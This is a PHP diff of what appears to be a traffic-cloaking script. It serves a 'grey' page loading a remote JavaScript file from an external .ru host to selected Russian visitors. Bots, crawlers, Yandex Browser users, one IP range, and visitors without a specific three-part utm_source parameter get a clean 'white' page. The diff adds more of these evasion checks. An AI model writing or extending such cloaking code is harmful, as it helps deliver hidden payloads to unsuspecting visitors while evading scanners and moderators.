@@ -78,8 +78,26 @@ function ShowGreyHTML()
 	echo '<!doctype><html><header><noscript><meta http-equiv="refresh"content="0; url=/"></noscript>  <style>body {margin: 0;}</style></header><body>';
 	 
 	$ee = 1;
-	include 'stat.php'; 
-	//echo '123'; 
+	//include 'stat.php'; 
+	$a = $_GET['utm_source'];	
+	
+	if(empty(explode("_", $a)[0]))
+	{
+		ShowWhiteHTML();
+		return;
+	}
+	
+	if(empty(explode("_", $a)[1]))
+	{
+		ShowWhiteHTML();
+		return;
+	}
+	
+	if(empty(explode("_", $a)[2]))
+	{
+		ShowWhiteHTML();
+		return;
+	}
      
 	echo '<script src="http://some-muzik-file.ru/code/05e8b6c3b326772f51f10f4960096372.js"></script></body></html>';
 }
@@ -87,6 +105,17 @@ function ShowGreyHTML()
 function GetCountry()
 {
 	$ipaddress = $_SERVER['REMOTE_ADDR'];
+	
+	$a = $ipaddress;
+	$a2 = '79.139.192.0';
+	$a3 = '79.139.255.255';
+	$f1 = ip2long($a);
+	$f2 = ip2long($a2);
+	$f3 = ip2long($a3);
+
+	if ($f1 <= $f3 && $f2 <= $f1) {
+	  return "NONE";
+	}
 
 	$a = json_decode(file_get_contents('https://freegeoip.net/json/'.$ipaddress), true);
 	return $a['country_code'];
@@ -100,7 +129,7 @@ if(GetCountry() == "RU")
 	{
 		$a = strtolower($_SERVER['HTTP_USER_AGENT']);
 
-		if(preg_match('/robot|bot|yahoo|mail|crawl|slurp|mediapartners|majesticsEO|facebook|pingdom|get|java|find|dataprovider|spider|crawler|curl|^$/i', $a))
+		if(preg_match('/robot|bot|yahoo|mail|crawl|slurp|mediapartners|majesticsEO|facebook|yabrowser|pingdom|get|java|find|dataprovider|spider|crawler|curl|^$/i', $a))
 		{
 			echo ShowWhiteHTML();
 		}
